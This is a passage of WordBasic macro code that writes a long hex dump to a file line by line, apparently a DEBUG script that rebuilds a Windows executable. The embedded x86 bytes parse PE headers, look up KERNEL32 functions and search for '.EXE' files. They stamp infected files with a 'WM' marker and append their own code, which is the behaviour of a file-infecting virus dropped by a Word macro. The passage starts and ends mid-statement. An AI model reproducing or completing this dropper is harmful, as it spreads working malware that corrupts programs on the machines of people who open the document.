"e 0220 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0250 00 60 00 00 00 04 00 00 00 00 00 00 02 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0280 00 40 00 00 ac 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02a0 00 50 00 00 78 01 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0300 00 20 00 00 00 10 00 00 00 12 00 00 00 06 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0330 00 02 00 00 00 18 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0340 00 00 00 00 40 00 00 c0 2e 69 64 61 74 61 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0350 00 10 00 00 00 40 00 00 00 02 00 00 00 1a 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0370 2e 72 65 6c 6f 63 00 00 00 10 00 00 00 50 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0380 00 02 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0700 55 e8 00 00 00 00 5d 8b dd 81 ed 06 10 40 00 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0710 00 10 00 00 83 c0 06 2b d8 89 9d d4 18 40 00 ba " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0720 8d 1b 40 00 03 d5 8b 8d 89 1b 40 00 55 e8 14 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0730 00 00 5d 83 f8 ff 74 5c 89 85 9e 1b 40 00 55 bb " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0740 7c 1b 40 00 03 dd 53 ff d0 5d 89 85 d0 18 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0750 bf 89 1b 40 00 03 fd 8b 0f 81 f9 41 59 41 4d 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0760 15 83 c7 04 8b d7 03 f9 57 e8 35 00 00 00 5f 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0770 07 83 c7 04 eb e1 c7 85 38 1b 40 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0780 e8 f1 05 00 00 e8 8f 05 00 00 e8 96 04 00 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0790 6f 06 00 00 8b 85 6c 1b 40 00 03 85 d4 18 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07a0 5d 50 c3 8b b5 d0 18 40 00 66 81 3e 4d 5a 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07b0 8c 00 00 00 33 c0 66 8b 46 3c 03 85 d0 18 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07c0 96 66 81 3e 50 45 75 78 8b 76 78 03 b5 d0 18 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07d0 00 8b 46 1c 03 85 d0 18 40 00 89 85 3c 1b 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07e0 8b 46 20 03 85 d0 18 40 00 89 85 40 1b 40 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07f0 46 24 03 85 d0 18 40 00 89 85 44 1b 40 00 33 c0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0800 51 8b f2 8b bd 40 1b 40 00 03 f8 8b 3f 03 bd d0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0810 18 40 00 f3 a6 83 f9 00 74 06 83 c0 04 59 eb e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0820 59 d1 e8 03 85 44 1b 40 00 33 db 66 8b 18 c1 e3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0830 02 03 9d 3c 1b 40 00 8b 03 03 85 d0 18 40 00 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0840 b8 ff ff ff ff c3 8b b5 d4 18 40 00 66 81 3e 4d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0850 5a 0f 85 96 00 00 00 33 c0 66 8b 46 3c 8b f0 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0860 b5 d4 18 40 00 66 81 3e 50 45 0f 85 7d 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0870 8b b6 80 00 00 00 03 b5 d4 18 40 00 8b c6 8b f0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0880 8b 76 0c 03 b5 d4 18 40 00 81 3e 4b 45 52 4e 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0890 05 83 c0 14 eb e8 8b f0 8b 46 10 03 85 d4 18 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08a0 00 89 85 48 1b 40 00 83 3e 00 74 41 8b 36 03 b5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08b0 d4 18 40 00 8b de 33 c0 83 3b 00 74 30 80 7b 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08c0 80 74 16 8b 33 03 b5 d4 18 40 00 83 c6 02 8b fa " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08d0 51 f3 a6 83 f9 00 59 74 06 40 83 c3 04 eb d9 c1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08e0 e0 02 03 85 48 1b 40 00 8b d8 8b 00 c3 b8 ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08f0 ff ff c3 c7 85 34 1b 40 00 00 00 00 00 e8 ae 02 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0900 00 00 89 85 30 1b 40 00 52 b8 80 00 00 00 e8 ab " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0910 02 00 00 5a 52 e8 07 02 00 00 83 f8 ff 0f 84 f1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0920 01 00 00 89 85 54 1b 40 00 e8 6e 02 00 00 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0930 ff 0f 84 d2 01 00 00 83 bd 4c 1b 40 00 00 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0940 c5 01 00 00 91 89 8d 50 1b 40 00 8b 85 54 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0950 00 8b 8d 50 1b 40 00 81 c1 11 20 00 00 e8 e9 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0960 00 00 83 f8 00 0f 84 72 01 00 00 89 85 58 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0970 00 8b 8d 50 1b 40 00 81 c1 11 20 00 00 e8 de 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0980 00 00 83 f8 00 0f 84 52 01 00 00 89 85 5c 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0990 00 8b f0 66 81 3e 4d 5a 0f 85 34 01 00 00 66 81 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09a0 7e 12 57 4d 0f 84 28 01 00 00 66 c7 46 12 57 4d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09b0 33 c0 66 8b 46 3c 66 3d 00 00 0f 84 12 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09c0 3b 05 50 1b 40 00 0f 83 06 01 00 00 03 85 5c 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09d0 40 00 8b f0 66 81 3e 50 45 0f 85 f3 00 00 00 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09e0 85 60 1b 40 00 8b 46 3c 89 85 68 1b 40 00 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09f0 6c 1b 40 00 89 85 74 1b 40 00 8b 46 28 89 85 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a00 1b 40 00 33 c0 66 8b 46 06 48 66 b9 28 00 66 f7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a10 e1 8b 5e 74 c1 e3 03 03 c3 83 c0 78 03 85 60 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a20 40 00 89 85 64 1b 40 00 8b f8 8b 47 10 89 85 78 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a30 1b 40 00 03 47 0c 89 85 10 10 40 00 89 85 70 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a40 40 00 57 8b 47 14 03 85 5c 1b 40 00 03 47 10 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a50 f8 be 00 10 40 00 03 f5 b9 11 10 00 00 fc f3 a4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a60 5f 81 47 10 11 10 00 00 81 85 50 1b 40 00 11 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a70 00 00 33 d2 8b 47 10 8b 8d 68 1b 40 00 51 f7 f1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a80 59 2b ca 01 4f 10 01 8d 50 1b 40 00 8b 47 10 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a90 47 08 83 4f 24 20 81 4f 24 00 00 00 20 81 4f 24 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0aa0 00 00 00 80 8b b5 60 1b 40 00 8b 85 70 1b 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ab0 89 46 28 8b 47 0c 03 47 10 89 46 50 8b 85 74 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ac0 40 00 89 85 6c 1b 40 00 c7 85 34 1b 40 00 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ad0 00 00 8b 85 5c 1b 40 00 e8 96 00 00 00 8b 85 58 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ae0 1b 40 00 e8 57 00 00 00 8b 85 54 1b 40 00 8b 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0af0 50 1b 40 00 e8 86 00 00 00 83 f8 ff 74 0b 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b00 54 1b 40 00 e8 87 00 00 00 8b 85 54 1b 40 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b10 2b 00 00 00 5a 8b 85 30 1b 40 00 e8 9e 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b20 c3 55 6a 00 68 80 00 00 00 6a 03 6a 00 6a 01 68 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b30 00 00 00 c0 52 8b 85 c9 1b 40 00 ff d0 5d c3 55 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b40 50 8b 85 4c 1c 40 00 ff d0 5d c3 55 6a 00 51 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b50 00 6a 04 6a 00 50 8b 85 0a 1c 40 00 ff d0 5d c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b60 55 51 6a 00 6a 00 6a 02 50 8b 85 20 1c 40 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b70 d0 5d c3 55 50 8b 85 38 1c 40 00 ff d0 5d c3 55 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b80 6a 00 6a 00 51 50 8b 85 a2 1c 40 00 ff d0 5d c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b90 55 50 8b 85 b7 1c 40 00 ff d0 5d c3 55 bb 4c 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ba0 40 00 03 dd 53 50 8b 85 ef 1b 40 00 ff d0 5d c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bb0 55 52 52 8b 85 0c 1d 40 00 ff d0 5a 5d c3 55 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bc0 52 8b 85 27 1d 40 00 ff d0 5d c3 55 50 68 80 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bd0 00 00 8b 85 d4 1c 40 00 ff d0 5d c3 55 50 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0be0 f1 1c 40 00 ff d0 5d c3 55 68 80 00 00 00 50 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bf0 85 5a 1d 40 00 ff d0 5d c3 55 b8 d8 19 40 00 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c00 c5 50 8b 85 3d 1d 40 00 ff d0 5d c3 55 50 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c10 9e 1b 40 00 ff d0 5d c3 55 52 50 8b 85 b5 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c20 00 ff d0 5d c3 bf 62 1d 40 00 03 fd 8b 0f 81 f9 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c30 49 41 48 53 74 25 83 c7 04 8b d7 57 51 55 e8 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c40 fc ff ff 5d 59 5f 03 f9 83 f8 ff 74 09 89 07 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c50 47 04 03 c5 89 03 83 c7 08 eb d1 c3 60 e8 aa 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c60 00 00 83 c1 28 8b 14 0c e8 0c 00 00 00 83 f8 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c70 75 05 e8 7c fc ff ff 61 c3 8b f2 fc ac 3c 00 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c80 16 3c 2e 75 f7 81 7e ff 2e 45 58 45 74 0c 81 7e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c90 ff 2e 65 78 65 74 03 33 c0 c3 b8 01 00 00 00 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ca0 e8 53 00 00 00 ff a1 70 1d 40 00 e8 48 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cb0 ff a1 86 1d 40 00 e8 3d 00 00 00 ff a1 9e 1d 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cc0 00 e8 32 00 00 00 ff a1 b6 1d 40 00 e8 27 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cd0 00 ff a1 d5 1d 40 00 e8 1c 00 00 00 ff a1 f4 1d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ce0 40 00 e8 11 00 00 00 ff a1 11 1e 40 00 e8 06 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cf0 00 00 ff a1 2c 1e 40 00 b9 04 00 00 00 e8 5a ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d00 ff ff 55 e8 04 00 00 00 8b cd 5d c3 e8 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d10 00 5d 81 ed 11 16 40 00 c3 c7 85 38 1b 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d20 00 00 00 e8 4e 00 00 00 83 bd 38 1b 40 00 05 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d30 44 b8 58 19 40 00 03 c5 e8 8e fe ff ff 83 f8 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d40 74 33 b8 d8 18 40 00 03 c5 e8 9a fe ff ff 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
